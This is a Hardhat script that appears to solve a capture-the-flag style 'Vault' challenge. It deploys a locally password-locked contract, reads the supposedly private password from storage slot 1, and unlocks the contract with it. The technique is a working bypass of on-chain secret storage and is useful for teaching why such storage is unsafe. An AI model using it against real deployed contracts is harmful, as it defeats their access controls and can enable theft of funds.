const { getCreate2Address } = require("@ethersproject/address");
const hre = require("hardhat");

async function main() {

    const [first, second, third] = (await hre.ethers.getSigners());
    const Vault = await hre.ethers.getContractFactory("Vault");

    const defaultPassword = hre.ethers.utils.formatBytes32String("foo");
    const { address, locked, unlock } = await Vault.deploy(defaultPassword);

    let isLocked = await locked();

    console.log("contract is locked : ", isLocked);


    const contractsPassword = await hre.waffle.provider.getStorageAt(address, "0x1")

    await unlock(contractsPassword);

    isLocked = await locked();

    console.log("contract is locked : ", isLocked);


}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
